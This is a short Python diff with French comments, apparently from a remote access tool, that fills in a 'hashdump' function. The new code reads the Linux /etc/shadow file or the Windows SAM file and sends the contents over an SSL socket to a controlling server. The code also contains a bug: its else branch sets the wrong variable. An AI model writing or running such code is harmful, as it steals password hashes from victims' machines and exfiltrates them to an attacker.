@@ -118,7 +118,16 @@ def search(ssl_socket):
 
 # Fonction permettant d'envoyer le fichier shadow au serveur
 def hashdump(ssl_socket):
-    print('hashdump')
+    os_type = os.name  # Récupération du nom de l'OS de la machine
+    if os_type == "posix":  # Test si la machine est une Linux
+        with open('/etc/shadow', 'r') as fichier_shadow:  # Ouverture du fichier shadow
+            hashdump_to_send = fichier_shadow.read()  # Lecture du contenu du fichier shadow
+    elif os_type == "nt":  # Test si la machine est une Windows
+        with open('C:/Windows/System32/config/SAM', 'r') as fichier_sam:
+            hashdump_to_send = fichier_sam.read()
+    else:
+        conf_to_send = "OS non reconnu" # Gestion d'erreur
+    ssl_socket.send(hashdump_to_send.encode())  # Envoie du fichier hashdump au serveur
 
 
 def main():
